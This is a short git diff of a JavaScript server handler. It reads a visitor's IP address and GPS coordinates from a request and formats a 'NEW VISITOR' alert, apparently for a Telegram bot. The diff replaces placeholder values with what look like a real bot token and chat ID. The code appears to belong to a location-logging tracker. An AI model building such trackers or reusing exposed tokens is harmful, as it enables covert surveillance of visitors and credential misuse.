@@ -4,8 +4,8 @@ export default async function handler(req, res) {
     const { ip, lat, lon, accuracy } = req.body;
     
     // GANTI DENGAN TOKEN DAN CHAT ID LO
-    const botToken = 'YOUR_BOT_TOKEN';
-    const chatId = 'YOUR_CHAT_ID';
+    const botToken = 'Y8784325672:AAGIjFlqRS_MnMzXaqcgn3lhIzcGaq-1E30';
+    const chatId = '8564704937';
     
     let msg = `📍 NEW VISITOR\n━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip || '-'}\n`;
     
